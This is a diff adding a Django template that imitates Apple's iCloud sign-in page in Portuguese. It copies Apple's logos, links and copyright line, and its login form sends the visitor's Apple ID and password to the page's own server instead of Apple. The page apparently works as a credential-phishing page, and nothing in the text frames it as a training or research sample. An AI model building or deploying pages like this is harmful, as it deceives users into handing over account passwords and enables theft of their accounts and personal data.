@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load staticfiles %}
+<head>
+    <meta charset="UTF-8">
+    <title>iCloud</title>   <link rel="icon" type="image/gif" sizes="160x160" href="../../static/css/sdsad.png">
+    <link rel="stylesheet" href="{% static 'css/css.css' %}">
+</head>
+<body class="animated shake"><div class="body-home">
+    <div class="header">        <div class="icloud-header">
+        <img class="img-icloud" src="../../static/css/icontwo.png">
+        <a href="https://www.apple.com/br/icloud/setup/"target="_blank"><img src="../../static/css/icon254578.png"></a>
+    </div>   </div>
+
+    <div>
+        <div class="container-two">
+        <img src="../../static/css/icloud.png">
+        <h1 id="ta"> Inicie sessão no iCloud</h1>
+        <form action="/index/" method="post">
+            {% csrf_token %}
+        <div class="form-logi">
+            <input id="apple-id" class="input-one" type="text" name="seu_nome" maxlength="100" placeholder="ID Apple" required />
+            <input id="apple-password" class="input-two" placeholder="senha" type="password" name="senha" maxlength="100" required />
+            <input class="input-button" type="submit">
+        </div>
+        </form>
+        <label>
+        <input class="input-ckb" type="checkbox">
+        <span class="aci">  Manter a sessão aberta</span>
+    </label>
+        <img class="img-2020" src="../../static/css/bcn00021.png">
+        <a href="https://iforgot.apple.com/password/verify/appleid"target="_blank"><h2 class="eqc-ps">Esqueceu o ID Apple ou a senha?</h2></a>
+        <span class="spn1020">você não tem um ID Apple?</span><a
+                href="https://appleid.apple.com/account#!&page=create"target="_blank">
+            <span class="spn2010">  Crie um agora.</span></a>
+    </div>    </div></div><div
+        class="footer">
+    <a href="https://www.apple.com/br/"target="_blank"><img src="../../static/css/logo.png"></a>
+    <ul>
+        <li><a href="https://www.apple.com/br/support/icloud/find-my-iphone-ipad-ipod-mac/"target="_blank">Verificar status de Bloqueio de Ativação</a></li>
+    <li><a href="https://www.apple.com/br/support/systemstatus/"target="_blank">Status do sistema</a></li>
+    <li><a href="https://www.apple.com/br/privacy/"target="_blank">Politica de Privacidade</a></li>
+    <li><a href="http://www.apple.com/legal/internet-services/icloud/ww/"target="_blank">Termos e condições</a></li>
+    <li><a>Copyright @ 2015 Apple Inc. Todos os direitos reservados.</a></li>
+    </ul></div></body></html>
+</body>
+</html>
